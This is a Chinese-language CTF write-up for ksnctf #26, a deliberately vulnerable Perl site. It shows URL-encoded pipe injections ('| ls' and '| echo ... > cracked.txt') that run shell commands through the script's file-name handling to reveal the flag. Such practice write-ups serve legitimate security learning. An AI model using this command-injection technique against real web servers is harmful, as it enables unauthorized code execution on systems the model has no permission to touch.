---
title: 'ksnctf #26 Sherlock Holmes'
metaAlignment: center
coverMeta: out
thumbnailImagePosition: left
date: 2017-03-28 14:06:03
categories:
	- Writeups
	- ksnctf
thumbnailImage: ksnctf.png
keywords:
    - ksnctf
    - Sherlock Holmes
tags:
    - Writeups
---
只要看的到原始碼就無敵了～
<!-- more -->

題目網頁明顯是perl寫的，就三個連結都可以一一點開，可以發現URL的部份會後綴檔案名稱，例如：
{% blockquote %}
http://ctfq.sweetduet.info:10080/~q26/index.pl/a_scandal_in_bohemia_1.txt
{% endblockquote %}

那如果後綴就是自己呢？ {% raw %}ლ(◉◞౪◟◉ )ლ{% endraw %}

於是...
{% blockquote %}
http://ctfq.sweetduet.info:10080/~q26/index.pl/index.pl
{% endblockquote %}
就看到原始碼啦～～
不過當然不可能這麼簡單，還有一個關卡要解。

其中只有一段原始碼是重點：

{% codeblock lang:perl %}
# Can you crack me? :P
open(F,'cracked.txt');
my $t = <F>;
chomp($t);
if ($t eq 'h@ck3d!') {
print 'FLAG_****************<br><br>';
}
unlink('cracked.txt');
####
{% endcodeblock %}

雖然我沒有寫過perl的經驗，但是看一看大概還是可以知道它是要開啟`cracked.txt`這個檔案，如果檔案內容是`h@ck3d!`的話就會印出FLAG。

看了看其他地方應該沒有什麼眉腳，把焦點放回到URL上，說到URL攻擊大概就是URL injection了，既然perl本身也是個script，應該可以成功呼叫系統命令。馬上嘗試簡單的`| ls`(有經過URL encode)：

{% blockquote %}
http://ctfq.sweetduet.info:10080/~q26/index.pl/%7C%20ls
{% endblockquote %}

結果很明顯，URL injection成功被執行了。
![URL](1.png)

原本想說看到`flag.txt`就在目錄底下，會不會下個`| cat flag.txt`破台了，結果果然沒有這麼簡單 {% raw %}(´_ゝ`){% endraw %}
![URL02](2.png)

還是得回歸`index.pl`的那段原始碼，不過已知URL injection可行的情況下，可以很輕易的建立`| echo "h@ck3d!" > cracked.txt`：
{% blockquote %}
http://ctfq.sweetduet.info:10080/~q26/index.pl/%7C%20echo%20%22h%40ck3d!%22%20%3E%20cracked.txt
{% endblockquote %}

執行以後，`cracked.txt`就成功被建立在目錄底下，只要再任意點選其他的一個連結，那段原始碼就會被執行並印出FLAG～～
![URL03](3.png)